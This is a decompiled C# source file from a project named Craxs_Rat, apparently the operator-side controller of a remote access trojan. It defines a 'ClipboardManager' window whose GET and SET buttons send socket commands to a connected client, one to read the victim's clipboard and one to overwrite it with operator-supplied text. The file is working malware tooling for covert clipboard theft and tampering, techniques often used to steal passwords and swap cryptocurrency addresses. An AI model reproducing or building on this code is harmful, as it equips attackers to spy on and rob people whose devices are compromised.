using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class ClipboardManager : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel1")]
	[CompilerGenerated]
	private Panel _Panel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BTN_GET")]
	private Button _BTN_GET;

	[AccessedThroughProperty("BTN_SET")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _BTN_SET;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	private List<Rectangle> RectInputText0;

	internal virtual Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual Panel Panel1
	{
		[CompilerGenerated]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = Panel1_Paint;
			Panel panel = _Panel1;
			if (panel != null)
			{
				panel.Paint -= value2;
			}
			_Panel1 = value;
			panel = _Panel1;
			if (panel != null)
			{
				panel.Paint += value2;
			}
		}
	}

	internal virtual Button BTN_GET
	{
		[CompilerGenerated]
		get
		{
			return _BTN_GET;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = BTN_GET_Click;
			Button button = _BTN_GET;
			if (button != null)
			{
				button.Click -= value2;
			}
			_BTN_GET = value;
			button = _BTN_GET;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("BoxClipboard")]
	internal virtual TextBox BoxClipboard
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button BTN_SET
	{
		[CompilerGenerated]
		get
		{
			return _BTN_SET;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = BTN_SET_Click;
			Button button = _BTN_SET;
			if (button != null)
			{
				button.Click -= value2;
			}
			_BTN_SET = value;
			button = _BTN_SET;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.Panel1 = new System.Windows.Forms.Panel();
		this.BTN_SET = new System.Windows.Forms.Button();
		this.BTN_GET = new System.Windows.Forms.Button();
		this.BoxClipboard = new System.Windows.Forms.TextBox();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.TOpacity.Interval = 1;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.BTN_SET);
		this.Panel1.Controls.Add(this.BTN_GET);
		this.Panel1.Controls.Add(this.BoxClipboard);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(373, 204);
		this.Panel1.TabIndex = 3;
		this.BTN_SET.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.BTN_SET.Location = new System.Drawing.Point(286, 104);
		this.BTN_SET.Name = "BTN_SET";
		this.BTN_SET.Size = new System.Drawing.Size(75, 23);
		this.BTN_SET.TabIndex = 3;
		this.BTN_SET.Text = "SET";
		this.BTN_SET.UseVisualStyleBackColor = true;
		this.BTN_GET.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.BTN_GET.Location = new System.Drawing.Point(286, 75);
		this.BTN_GET.Name = "BTN_GET";
		this.BTN_GET.Size = new System.Drawing.Size(75, 23);
		this.BTN_GET.TabIndex = 1;
		this.BTN_GET.Text = "GET";
		this.BTN_GET.UseVisualStyleBackColor = true;
		this.BoxClipboard.BackColor = System.Drawing.Color.Black;
		this.BoxClipboard.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.BoxClipboard.ForeColor = System.Drawing.Color.SkyBlue;
		this.BoxClipboard.Location = new System.Drawing.Point(21, 28);
		this.BoxClipboard.Multiline = true;
		this.BoxClipboard.Name = "BoxClipboard";
		this.BoxClipboard.Size = new System.Drawing.Size(247, 147);
		this.BoxClipboard.TabIndex = 0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(373, 204);
		base.Controls.Add(this.Panel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.MaximizeBox = false;
		base.Name = "ClipboardManager";
		base.Opacity = 0.0;
		this.Text = "ClipboardManager";
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		base.ResumeLayout(false);
	}

	private void ClipboardManager_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\20.ico");
		SpyStyle();
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	public ClipboardManager()
	{
		base.Load += ClipboardManager_Load;
		Title = "null";
		RectInputText0 = new List<Rectangle>();
		InitializeComponent();
		Font = reso.f;
	}

	private void SpyStyle()
	{
		foreach (TextBox item in Panel1.Controls.OfType<TextBox>())
		{
			item.ForeColor = SpySettings.DefaultColor_Foreground;
			item.BackColor = SpySettings.DefaultColor_Background;
			RectInputText0.Add(checked(new Rectangle(item.Location.X - 1, item.Location.Y - 1, item.Width + 1, item.Height + 1)));
		}
		foreach (Button item2 in Panel1.Controls.OfType<Button>())
		{
			item2.BackColor = SpySettings.DefaultColor_Foreground;
			item2.ForeColor = SpySettings.DefaultColor_Background;
		}
		foreach (Panel item3 in base.Controls.OfType<Panel>())
		{
			item3.BackColor = SpySettings.DefaultColor_Background;
		}
		Refresh();
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (RectInputText0.Count <= 0)
		{
			return;
		}
		foreach (Rectangle item in RectInputText0)
		{
			if (item.Width > 0)
			{
				e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), item);
			}
		}
	}

	private void BTN_SET_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "set" + Data.SPL_DATA + BoxClipboard.Text,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void BTN_GET_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}
}
